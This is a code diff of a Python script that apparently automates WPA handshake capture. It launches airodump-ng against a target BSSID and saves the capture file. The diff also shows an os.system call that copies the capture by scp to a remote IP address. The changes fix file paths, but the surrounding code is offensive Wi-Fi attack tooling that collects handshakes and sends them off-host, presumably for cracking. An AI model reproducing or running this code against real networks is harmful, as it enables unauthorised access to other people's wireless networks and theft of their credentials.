@@ -14,7 +14,7 @@ def capture(channel, BSSID, interface):
 	command.append("--bssid")
 	command.append(BSSID)
 	command.append("-w")
-	command.append("home/isis/psk/psk")
+	command.append("/home/isis/psk/psk")
 	command.append(interface)
 	DN=open (os.devnull, "w")
 	proc_airodump= subprocess.Popen(command, stdout=DN, stderr=DN)
@@ -29,7 +29,7 @@ def check_routine (BSSID, proc_airodump):
 		check_routine(BSSID, proc_airodump)
 	else:
 		print ("gelukt")
-		os.system("scp home/isis/psk/psk-01.cap isis@193.191.187.44:.")
+		os.system("scp /home/isis/psk/psk-01.cap isis@193.191.187.44:.")
 		os.kill(proc_airodump.pid, SIGINT)
 
 def hand_assignment(BSSID, ESSID):
@@ -65,7 +65,7 @@ def cleanup():
 
 
 def automated(BSSID, channel, ESSID):
-	os.makedirs("home/isis/psk")
+	os.makedirs("/home/isis/psk")
 	interface= start_monitor("wlan0", channel)
 	capture(channel, BSSID, interface)
 	hand_assignment(BSSID, ESSID)
